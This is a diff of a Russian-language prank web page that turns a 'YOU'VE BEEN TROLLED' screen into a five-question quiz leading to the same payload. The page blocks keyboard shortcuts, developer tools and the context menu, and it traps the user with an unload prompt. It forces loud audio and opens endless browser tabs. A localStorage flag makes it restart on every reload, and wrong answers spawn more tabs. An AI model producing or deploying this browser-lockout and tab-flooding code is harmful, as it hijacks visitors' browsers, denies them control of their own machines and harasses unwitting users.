@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🔴 TROLLED</title>
+    <title>🔴 TROLLED QUEST</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -12,87 +12,156 @@
             justify-content: center; align-items: center;
             font-family: 'Impact', 'Arial Black', sans-serif;
             user-select: none; position: relative;
-            cursor: none;
+            cursor: default;
         }
-        .troll-container {
+        .quest-container {
             position: relative; width: 100%; height: 100%;
             display: flex; flex-direction: column;
             justify-content: center; align-items: center;
             background: radial-gradient(circle, #1a0000, #000000);
             animation: pulse 0.3s infinite;
+            z-index: 1;
         }
         @keyframes pulse {
             0%, 100% { background: radial-gradient(circle, #1a0000, #000000); }
             50% { background: radial-gradient(circle, #ff0000, #000000); }
         }
-        .troll-gif {
+        .quest-gif {
             width: 100%; height: 100%; object-fit: contain;
             position: absolute; top: 0; left: 0; z-index: 1;
-            opacity: 0.9; pointer-events: none;
-            filter: drop-shadow(0 0 80px rgba(255,0,0,0.5)) brightness(1.2);
+            opacity: 0.5; pointer-events: none;
+            filter: drop-shadow(0 0 80px rgba(255,0,0,0.3)) brightness(0.6);
         }
-        .troll-text {
-            position: relative; z-index: 2;
-            color: #ff0044;
-            font-size: clamp(2rem, 12vw, 8rem);
-            font-weight: 900; text-transform: uppercase;
-            text-align: center;
-            text-shadow: 0 0 20px rgba(255,0,68,0.8), 0 0 40px rgba(255,0,68,0.5), 0 0 80px rgba(255,0,68,0.3), 0 4px 0 #880022, 0 8px 0 #660011, 0 12px 0 #440008, 0 16px 10px rgba(0,0,0,0.8);
-            letter-spacing: 0.1em;
-            animation: shake 0.1s infinite;
-            padding: 20px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 20px;
-            backdrop-filter: blur(5px);
+        .quest-content {
+            position: relative; z-index: 3;
+            display: flex; flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            padding: 40px;
+            background: rgba(0,0,0,0.85);
+            border-radius: 30px;
             border: 3px solid #ff0044;
+            backdrop-filter: blur(10px);
             box-shadow: 0 0 100px rgba(255,0,68,0.2);
-            transform: rotate(-5deg);
+            max-width: 90%;
+            width: 600px;
+            transition: all 0.5s;
         }
-        @keyframes shake {
-            0%, 100% { transform: rotate(-5deg) scale(1); }
-            25% { transform: rotate(0deg) scale(1.05); }
-            50% { transform: rotate(5deg) scale(1); }
-            75% { transform: rotate(0deg) scale(0.95); }
-        }
-        .troll-sub {
-            position: relative; z-index: 2;
-            color: #ff6688;
-            font-size: clamp(0.8rem, 3vw, 2rem);
-            font-family: 'Courier New', monospace;
-            margin-top: 20px;
+        .quest-title {
+            color: #ff0044;
+            font-size: clamp(1.5rem, 5vw, 3rem);
             text-shadow: 0 0 30px rgba(255,0,68,0.5);
-            animation: blink 0.1s infinite;
-            background: rgba(0,0,0,0.5);
-            padding: 10px 30px;
-            border-radius: 50px;
+            text-align: center;
+            animation: shake 0.5s infinite;
+        }
+        .quest-text {
+            color: #ff6688;
+            font-family: 'Courier New', monospace;
+            font-size: clamp(0.9rem, 2vw, 1.2rem);
+            text-align: center;
+            line-height: 1.6;
+            opacity: 0.9;
+        }
+        .quest-level {
+            color: #ff0044;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            background: rgba(255,0,68,0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
             border: 1px solid #ff0044;
         }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
+        .quest-btn {
+            padding: 15px 40px;
+            font-size: clamp(1rem, 2vw, 1.5rem);
+            font-family: 'Impact', sans-serif;
+            background: #ff0044;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 0 30px rgba(255,0,68,0.5);
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            width: 100%;
+            max-width: 300px;
+            position: relative;
+            z-index: 99999;
+        }
+        .quest-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 60px rgba(255,0,68,0.8);
+        }
+        .quest-btn:active {
+            transform: scale(0.95);
+        }
+        .quest-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        .quest-input {
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-family: 'Courier New', monospace;
+            background: rgba(0,0,0,0.5);
+            border: 2px solid #ff0044;
+            border-radius: 30px;
+            color: #ff6688;
+            width: 100%;
+            max-width: 300px;
+            text-align: center;
+            outline: none;
+            z-index: 99999;
+            position: relative;
+            pointer-events: all !important;
+        }
+        .quest-input::placeholder {
+            color: #ff004466;
+        }
+        .quest-input:focus {
+            border-color: #ff6688;
+            box-shadow: 0 0 30px rgba(255,0,68,0.3);
+        }
+        .quest-hidden {
+            display: none !important;
+        }
+        .quest-progress {
+            width: 100%;
+            max-width: 300px;
+            height: 4px;
+            background: rgba(255,0,68,0.2);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .quest-progress-bar {
+            height: 100%;
+            background: #ff0044;
+            transition: width 0.5s;
+            width: 0%;
+            box-shadow: 0 0 20px rgba(255,0,68,0.5);
+        }
+        @keyframes shake {
+            0%, 100% { transform: rotate(-3deg) scale(1); }
+            50% { transform: rotate(3deg) scale(1.02); }
         }
         .music-indicator {
             position: fixed; bottom: 20px; right: 20px; z-index: 999;
-            color: #ff0044; font-size: 14px;
+            color: #ff0044; font-size: 12px;
             font-family: 'Courier New', monospace;
             background: rgba(0,0,0,0.9);
-            padding: 12px 18px;
+            padding: 8px 14px;
             border-radius: 20px;
-            border: 2px solid #ff0044;
-            animation: blink 0.5s infinite;
-            opacity: 0.8;
-            font-weight: bold;
+            border: 1px solid #ff0044;
+            animation: blink 1s infinite;
+            opacity: 0.6;
+            pointer-events: none;
         }
-        @media (max-width: 480px) {
-            .troll-text { font-size: clamp(1.8rem, 10vw, 4rem); padding: 10px 20px; transform: rotate(-3deg); }
-            .troll-sub { font-size: clamp(0.6rem, 2.5vw, 1rem); padding: 6px 16px; }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
-        .troll-container { animation: fadeIn 0.5s ease-out; }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1); }
-        }
-        .troll-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 0; }
         .confetti { position: fixed; z-index: 0; color: #ff0044; font-size: 24px; animation: fall linear infinite; opacity: 0.3; pointer-events: none; }
         @keyframes fall {
             0% { transform: translateY(-100vh) rotate(0deg); }
@@ -101,23 +170,124 @@
         .overlay-block {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 9999; background: transparent;
-            pointer-events: all;
+            pointer-events: none;
         }
         #blockScreen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.01);
             z-index: 9998;
-            pointer-events: all;
+            pointer-events: none;
+        }
+        .quest-logo {
+            font-size: 3rem;
+            animation: pulse 0.5s infinite;
+        }
+        .trolled-active {
+            animation: none !important;
+        }
+        .trolled-text {
+            color: #ff0044;
+            font-size: clamp(2rem, 12vw, 8rem);
+            font-weight: 900;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(255,0,68,0.8), 0 0 40px rgba(255,0,68,0.5), 0 0 80px rgba(255,0,68,0.3);
+            animation: shake 0.1s infinite;
+            position: relative;
+            z-index: 2;
+        }
+        .trolled-sub {
+            color: #ff6688;
+            font-size: clamp(0.8rem, 3vw, 2rem);
+            font-family: 'Courier New', monospace;
+            animation: blink 0.1s infinite;
+            position: relative;
+            z-index: 2;
         }
     </style>
 </head>
 <body>
     <div id="blockScreen"></div>
-    <div class="troll-bg"></div>
-    <div class="troll-container">
-        <img class="troll-gif" src="https://i.pinimg.com/originals/a8/01/32/a80132507ba34499b157be336517c72b.gif" alt="TROLL" loading="eager">
-        <div class="troll-text">🔴 YOU'VE BEEN<br>TROLLED</div>
-        <div class="troll-sub">⚡ HAHA NICE TRY ⚡</div>
+    <div class="quest-container">
+        <img class="quest-gif" src="https://i.pinimg.com/originals/a8/01/32/a80132507ba34499b157be336517c72b.gif" alt="TROLL" loading="eager">
+        
+        <!-- УРОВЕНЬ 1 -->
+        <div class="quest-content" id="level1">
+            <div class="quest-logo">🔴</div>
+            <div class="quest-level">УРОВЕНЬ 1/5</div>
+            <div class="quest-title">ТЫ ПОПАЛ В ЛОВУШКУ</div>
+            <div class="quest-text">
+                Добро пожаловать в игру.<br>
+                Чтобы выбраться, ты должен пройти все уровни.<br>
+                <span style="color:#ff0044;font-weight:bold;">Первый вопрос:</span><br>
+                Какой сайт создал этот троллинг?
+            </div>
+            <input class="quest-input" id="answer1" placeholder="Введи ответ..." autocomplete="off">
+            <button class="quest-btn" id="btn1">ПРОВЕРИТЬ</button>
+            <div class="quest-progress"><div class="quest-progress-bar" id="progress1" style="width:20%"></div></div>
+        </div>
+
+        <!-- УРОВЕНЬ 2 -->
+        <div class="quest-content quest-hidden" id="level2">
+            <div class="quest-logo">⚡</div>
+            <div class="quest-level">УРОВЕНЬ 2/5</div>
+            <div class="quest-title">ПОЧУВСТВУЙ АД</div>
+            <div class="quest-text">
+                Отличная работа!<br>
+                Но это был лишь разогрев.<br>
+                <span style="color:#ff0044;font-weight:bold;">Второй вопрос:</span><br>
+                Назови полную ссылку на наш GitHub-репозиторий.
+            </div>
+            <input class="quest-input" id="answer2" placeholder="https://github.com/..." autocomplete="off">
+            <button class="quest-btn" id="btn2">ПРОВЕРИТЬ</button>
+            <div class="quest-progress"><div class="quest-progress-bar" id="progress2" style="width:40%"></div></div>
+        </div>
+
+        <!-- УРОВЕНЬ 3 -->
+        <div class="quest-content quest-hidden" id="level3">
+            <div class="quest-logo">🔥</div>
+            <div class="quest-level">УРОВЕНЬ 3/5</div>
+            <div class="quest-title">ИГРА НА ВРЕМЯ</div>
+            <div class="quest-text">
+                Ты слишком умён для меня.<br>
+                Но я знаю твою слабость.<br>
+                <span style="color:#ff0044;font-weight:bold;">Третий вопрос:</span><br>
+                Какой ник у создателя этого сайта?
+            </div>
+            <input class="quest-input" id="answer3" placeholder="Введи ник..." autocomplete="off">
+            <button class="quest-btn" id="btn3">ПРОВЕРИТЬ</button>
+            <div class="quest-progress"><div class="quest-progress-bar" id="progress3" style="width:60%"></div></div>
+        </div>
+
+        <!-- УРОВЕНЬ 4 -->
+        <div class="quest-content quest-hidden" id="level4">
+            <div class="quest-logo">💀</div>
+            <div class="quest-level">УРОВЕНЬ 4/5</div>
+            <div class="quest-title">ПОСЛЕДНИЙ РУБЕЖ</div>
+            <div class="quest-text">
+                Ты почти у цели.<br>
+                Но я не сдамся так легко.<br>
+                <span style="color:#ff0044;font-weight:bold;">Четвёртый вопрос:</span><br>
+                Сколько вкладок открывает наш троллинг за 1 секунду?
+            </div>
+            <input class="quest-input" id="answer4" placeholder="Введи число..." autocomplete="off">
+            <button class="quest-btn" id="btn4">ПРОВЕРИТЬ</button>
+            <div class="quest-progress"><div class="quest-progress-bar" id="progress4" style="width:80%"></div></div>
+        </div>
+
+        <!-- ФИНАЛ -->
+        <div class="quest-content quest-hidden" id="level5">
+            <div class="quest-logo">😈</div>
+            <div class="quest-level">ФИНАЛ</div>
+            <div class="quest-title">ТЫ ПОБЕДИЛ?</div>
+            <div class="quest-text">
+                Ты прошёл все уровни!<br>
+                Но это только начало.<br>
+                <span style="color:#ff0044;font-weight:bold;">Нажми на кнопку, чтобы запустить АД!</span>
+            </div>
+            <button class="quest-btn" id="btnFinal" style="background:#880022;">ЗАПУСТИТЬ АД</button>
+            <div class="quest-progress"><div class="quest-progress-bar" id="progress5" style="width:100%"></div></div>
+        </div>
+
         <div class="music-indicator" id="statusIndicator">🔊 PHONK MAX</div>
     </div>
 
@@ -125,108 +295,21 @@
         // ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
         let isTrolled = false;
         let tabCount = 0;
-        let audioContext = null;
         let audio = null;
         let audioStarted = false;
         let tabInterval = null;
-        
-        // ========== БЛОКИРОВКА КЛАВИАТУРЫ ==========
-        function blockKeyboard() {
-            document.addEventListener('keydown', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                
-                // Блокируем все комбинации
-                if (e.ctrlKey || e.altKey || e.metaKey || e.shiftKey) {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Блокируем системные клавиши
-                const blockedKeys = [
-                    'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
-                    'Escape','Tab','CapsLock','Shift','Control','Alt','Meta',
-                    'PrintScreen','ScrollLock','Pause','Insert','Home','End',
-                    'PageUp','PageDown','Delete','ContextMenu'
-                ];
-                
-                if (blockedKeys.includes(e.key)) {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Блокируем комбинации с Ctrl
-                if (e.ctrlKey && ['w','W','t','T','n','N','r','R','s','S','p','P','a','A','c','C','v','V','x','X','z','Z','y','Y'].includes(e.key)) {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Блокируем Alt+F4
-                if (e.altKey && e.key === 'F4') {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Блокируем Alt+Tab
-                if (e.altKey && e.key === 'Tab') {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                // Блокируем Win ключ
-                if (e.key === 'Meta' || e.key === 'Windows') {
-                    e.preventDefault();
-                    return false;
-                }
-                
-                return false;
-            }, true);
-            
-            // Блокируем клавиатурные события на всех уровнях
-            document.addEventListener('keyup', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }, true);
-            
-            document.addEventListener('keypress', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                return false;
-            }, true);
-        }
+        let currentLevel = 1;
+        let isQuestComplete = false;
 
-        // ========== БЛОКИРОВКА МЫШИ ==========
-        function blockMouse() {
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            
-            document.addEventListener('selectstart', function(e) {
-                e.preventDefault();
-                return false;
-            });
-            
-            // Блокируем выделение
-            document.addEventListener('mousedown', function(e) {
-                if (e.button === 2) {
-                    e.preventDefault();
-                    return false;
-                }
-            });
-        }
+        // ========== ПРАВИЛЬНЫЕ ОТВЕТЫ ==========
+        const answers = {
+            1: ['youbeentrolled', 'youbeentrolled.com', 'пися бобра', 'pisun bobra', 'pisyabobra'],
+            2: ['https://github.com/pisunbobrahacker/youbeentrolled', 'https://github.com/PisunBobraHacker/youbeentrolled', 'github.com/pisunbobrahacker/youbeentrolled'],
+            3: ['pisunbobrahacker', 'pisun bobra', 'пися бобра', 'pisyabobra'],
+            4: ['5', '5 вкладок', 'пять', 'пять вкладок']
+        };
 
-        // ========== БЛОКИРОВКА ЗАКРЫТИЯ ==========
-        function blockClose() {
-            window.onbeforeunload = function(e) {
-                e.preventDefault();
-                e.returnValue = '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
-                return '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
-            };
-        }
-
-        // ========== ИНИЦИАЛИЗАЦИЯ АУДИО ==========
+        // ========== АУДИО ==========
         function initAudio() {
             audio = new Audio();
             audio.src = 'https://audio.com/djxavier014/collections/troll-face-phonk/stream';
@@ -235,62 +318,154 @@
             audio.muted = false;
         }
 
-        // ========== МАКСИМАЛЬНЫЙ АВТОПЛЕЙ ==========
         function forcePlayAudio() {
             if (audioStarted) return;
-            
             audio.play().then(() => {
                 audioStarted = true;
                 audio.volume = 1.0;
-                document.getElementById('statusIndicator').textContent = '🔊 PHONK MAX';
             }).catch(() => {
-                // Бесконечные попытки
                 const tryPlay = setInterval(() => {
                     audio.play().then(() => {
                         audioStarted = true;
                         audio.volume = 1.0;
                         clearInterval(tryPlay);
-                        document.getElementById('statusIndicator').textContent = '🔊 PHONK MAX';
                     }).catch(() => {});
                 }, 100);
             });
         }
 
-        // ========== БЕСКОНЕЧНЫЙ СПАВН ВКЛАДОК ==========
+        // ========== БЛОКИРОВКИ (только для НЕ квеста) ==========
+        function blockKeyboard() {
+            document.addEventListener('keydown', function(e) {
+                // Проверяем, является ли цель полем ввода
+                const target = e.target;
+                const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable;
+                
+                // Если это поле ввода - разрешаем
+                if (isInput) {
+                    return true;
+                }
+                
+                // Если квест пройден - блокируем всё
+                if (isQuestComplete) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                
+                // Блокируем только опасные клавиши вне полей ввода
+                const blockedKeys = ['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
+                    'Escape','Tab','CapsLock','PrintScreen','ScrollLock','Pause','Insert','Home','End',
+                    'PageUp','PageDown','Delete','ContextMenu'];
+                
+                if (blockedKeys.includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                
+                // Блокируем комбинации с Ctrl
+                if (e.ctrlKey && ['w','W','t','T','n','N','r','R','s','S','p','P','a','A','c','C','v','V','x','X','z','Z','y','Y'].includes(e.key)) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                
+                // Блокируем Alt+F4 и Alt+Tab
+                if (e.altKey && (e.key === 'F4' || e.key === 'Tab')) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                
+                // Блокируем Win ключ
+                if (e.key === 'Meta' || e.key === 'Windows') {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    return false;
+                }
+                
+                return true;
+            }, true);
+        }
+
+        function blockMouse() {
+            document.addEventListener('contextmenu', function(e) {
+                // Разрешаем только на полях ввода и кнопках
+                const target = e.target;
+                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'BUTTON') {
+                    return true;
+                }
+                e.preventDefault();
+                return false;
+            });
+            
+            document.addEventListener('selectstart', function(e) {
+                const target = e.target;
+                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+                    return true;
+                }
+                e.preventDefault();
+                return false;
+            });
+        }
+
+        function blockClose() {
+            window.onbeforeunload = function(e) {
+                if (!isQuestComplete) {
+                    e.preventDefault();
+                    e.returnValue = '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+                    return '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+                }
+            };
+        }
+
+        function blockInspector() {
+            document.addEventListener('keydown', function(e) {
+                const target = e.target;
+                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
+                    return true;
+                }
+                if (e.key === 'F12') { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) { e.preventDefault(); return false; }
+                if (e.ctrlKey && e.key === 'u') { e.preventDefault(); return false; }
+                return true;
+            });
+        }
+
+        // ========== СПАВН ВКЛАДОК ==========
         function spawnTabs(count = 10) {
+            if (isQuestComplete) return;
             for (let i = 0; i < count; i++) {
                 setTimeout(() => {
                     try {
                         const win = window.open('https://youbeentrolled.com', '_blank');
                         if (!win) {
-                            // Если блокирует - открываем через location
                             if (tabCount % 5 === 0) {
                                 window.location.href = 'https://youbeentrolled.com';
                             }
                         }
                         tabCount++;
                         document.getElementById('statusIndicator').textContent = `📊 ВКЛАДОК: ${tabCount}`;
-                    } catch(e) {
-                        // Игнорируем ошибки
-                    }
+                    } catch(e) {}
                 }, i * 50);
             }
         }
 
-        // ========== БЕСКОНЕЧНЫЙ ЦИКЛ ==========
         function startInfiniteTabs() {
-            // Первая волна
+            if (isQuestComplete) return;
             spawnTabs(20);
-            
-            // Бесконечный цикл
             tabInterval = setInterval(() => {
+                if (isQuestComplete) {
+                    clearInterval(tabInterval);
+                    return;
+                }
                 if (tabCount < 200) {
                     spawnTabs(5);
                 } else {
-                    // Если слишком много - замедляем
                     clearInterval(tabInterval);
-                    tabInterval = setInterval(() => {
-                        spawnTabs(2);
+                    tabInterval = setInterval(() => { 
+                        if (!isQuestComplete) spawnTabs(2); 
                     }, 3000);
                 }
             }, 1000);
@@ -298,16 +473,10 @@
 
         // ========== ЭФФЕКТЫ ==========
         function startEffects() {
-            // Максимальная вибрация
             document.body.style.animation = 'shake 0.05s infinite';
-            document.querySelector('.troll-container').style.animation = 'pulse 0.2s infinite';
-            
-            // Мерцание текста
-            document.querySelector('.troll-text').style.animation = 'shake 0.05s infinite';
-            document.querySelector('.troll-sub').style.animation = 'blink 0.05s infinite';
+            document.querySelector('.quest-container').style.animation = 'pulse 0.2s infinite';
         }
 
-        // ========== СОЗДАНИЕ КОНФЕТТИ ==========
         function createConfetti() {
             const symbols = ['🔥', '💀', '⚡', '🔴', '💢', '‼️', '⛔', '💥', '🎯', '😈'];
             for (let i = 0; i < 60; i++) {
@@ -322,99 +491,121 @@
             }
         }
 
-        // ========== ЗАЩИТА ОТ ИНСПЕКТОРА ==========
-        function blockInspector() {
-            // Блокируем F12
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'F12') {
-                    e.preventDefault();
-                    return false;
-                }
-                if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) {
-                    e.preventDefault();
-                    return false;
-                }
-                if (e.ctrlKey && e.key === 'u') {
-                    e.preventDefault();
-                    return false;
-                }
-            });
+        // ========== КВЕСТ ЛОГИКА ==========
+        function checkAnswer(level, inputId, btnId, nextLevel) {
+            const input = document.getElementById(inputId);
+            const btn = document.getElementById(btnId);
+            const userAnswer = input.value.trim().toLowerCase();
             
-            // Блокируем правый клик
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                return false;
-            });
+            const isCorrect = answers[level].some(a => userAnswer === a.toLowerCase());
+            
+            if (isCorrect) {
+                document.getElementById(`level${level}`).classList.add('quest-hidden');
+                document.getElementById(`level${nextLevel}`).classList.remove('quest-hidden');
+                currentLevel = nextLevel;
+                
+                if (nextLevel === 5) {
+                    document.getElementById('btnFinal').addEventListener('click', function() {
+                        isQuestComplete = true;
+                        startTroll();
+                    });
+                }
+            } else {
+                btn.textContent = '❌ НЕПРАВИЛЬНО!';
+                btn.style.background = '#880022';
+                setTimeout(() => {
+                    btn.textContent = 'ПРОВЕРИТЬ';
+                    btn.style.background = '#ff0044';
+                }, 1500);
+                
+                spawnTabs(3);
+            }
         }
 
-        // ========== ГЛАВНАЯ ЛОГИКА ==========
+        // ========== ГЛАВНЫЙ ТРОЛЛИНГ ==========
         function startTroll() {
             if (isTrolled) return;
             isTrolled = true;
             
-            // Запускаем аудио
             forcePlayAudio();
-            
-            // Блокируем всё
             blockClose();
-            blockKeyboard();
-            blockMouse();
-            blockInspector();
-            
-            // Запускаем эффекты
             startEffects();
-            
-            // Бесконечные вкладки
             startInfiniteTabs();
             
-            // Сохраняем состояние
             localStorage.setItem('trolled', 'true');
             localStorage.setItem('trolled_time', Date.now().toString());
+            
+            // Скрываем квест, показываем троллинг
+            document.querySelector('.quest-content').classList.add('quest-hidden');
+            document.querySelector('.quest-gif').style.opacity = '0.9';
+            document.querySelector('.quest-gif').style.filter = 'drop-shadow(0 0 80px rgba(255,0,0,0.5)) brightness(1.2)';
+            
+            const container = document.querySelector('.quest-container');
+            const trollHTML = `
+                <div style="position:relative;z-index:2;text-align:center;">
+                    <div class="trolled-text">🔴 YOU'VE BEEN<br>TROLLED</div>
+                    <div class="trolled-sub">⚡ HAHA NICE TRY ⚡</div>
+                </div>
+            `;
+            container.innerHTML = trollHTML + container.innerHTML;
+            
+            const gif = document.querySelector('.quest-gif');
+            gif.style.position = 'absolute';
+            gif.style.top = '0';
+            gif.style.left = '0';
+            gif.style.zIndex = '1';
+            
+            document.getElementById('statusIndicator').textContent = '💀 АД ЗАПУЩЕН!';
         }
 
         // ========== ПРОВЕРКА СОСТОЯНИЯ ==========
         function checkState() {
             const saved = localStorage.getItem('trolled');
             if (saved === 'true') {
-                setTimeout(() => {
-                    startTroll();
-                }, 100);
+                isQuestComplete = true;
+                setTimeout(startTroll, 100);
             }
         }
 
-        // ========== ЗАГРУЗКА ==========
+        // ========== ИНИЦИАЛИЗАЦИЯ ==========
         function init() {
-            // Блокируем сразу
             blockKeyboard();
             blockMouse();
             blockInspector();
-            
-            // Инициализация
+            blockClose();
             initAudio();
             createConfetti();
-            
-            // Проверяем состояние
             checkState();
-            
-            // Автозапуск
-            setTimeout(() => {
-                if (!isTrolled) {
-                    startTroll();
-                }
-            }, 2000);
-            
-            // Защита от закрытия через кнопки
-            document.addEventListener('visibilitychange', function() {
-                if (document.hidden && isTrolled) {
-                    // Если пытаются свернуть - форсим
-                    setTimeout(() => {
-                        spawnTabs(5);
-                    }, 100);
-                }
+
+            document.getElementById('btn1').addEventListener('click', function() {
+                checkAnswer(1, 'answer1', 'btn1', 2);
             });
+            document.getElementById('btn2').addEventListener('click', function() {
+                checkAnswer(2, 'answer2', 'btn2', 3);
+            });
+            document.getElementById('btn3').addEventListener('click', function() {
+                checkAnswer(3, 'answer3', 'btn3', 4);
+            });
+            document.getElementById('btn4').addEventListener('click', function() {
+                checkAnswer(4, 'answer4', 'btn4', 5);
+            });
+
+            document.querySelectorAll('.quest-input').forEach((input, index) => {
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') {
+                        const btn = document.getElementById(`btn${index + 1}`);
+                        if (btn) btn.click();
+                    }
+                });
+            });
+
+            setTimeout(() => {
+                if (!isTrolled && currentLevel === 1) {
+                    document.getElementById('btn1').click();
+                }
+            }, 30000);
         }
 
-        // ========== ЗАПУСК ==========
         if (document.readyState === 'complete') {
             init();
         } else {
